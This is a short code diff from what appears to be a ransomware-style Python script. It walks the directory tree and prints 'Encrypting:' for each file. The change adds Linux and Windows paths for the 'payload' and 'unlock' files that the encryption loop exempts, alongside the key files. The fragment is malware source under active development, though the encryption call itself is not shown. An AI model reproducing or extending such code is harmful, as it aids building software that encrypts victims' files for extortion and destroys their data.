@@ -57,8 +57,10 @@ for root, dirs, files in os.walk("."):
         # Do not encrypt the private/public key or payload
         if (not (filePath.endswith(constants.PRIVATE_KEY_FILE_PATH) or 
                 filePath.endswith( constants.PUBLIC_KEY_FILE_PATH) or
-                filePath.endswith(constants.PAYLOAD_FILE_PATH) or
-                filePath.endswith(constants.MY_UNLOCK_FILE_PATH))):
+                filePath.endswith(constants.PAYLOAD_FILE_PATH_LINUX) or
+                filePath.endswith(constants.MY_UNLOCK_FILE_PATH_LINUX) or
+                filePath.endswith(constants.PAYLOAD_FILE_PATH_WIN) or
+                filePath.endswith(constants.MY_UNLOCK_FILE_PATH_WIN))):
 
             print("Encrypting: " + filePath)
 
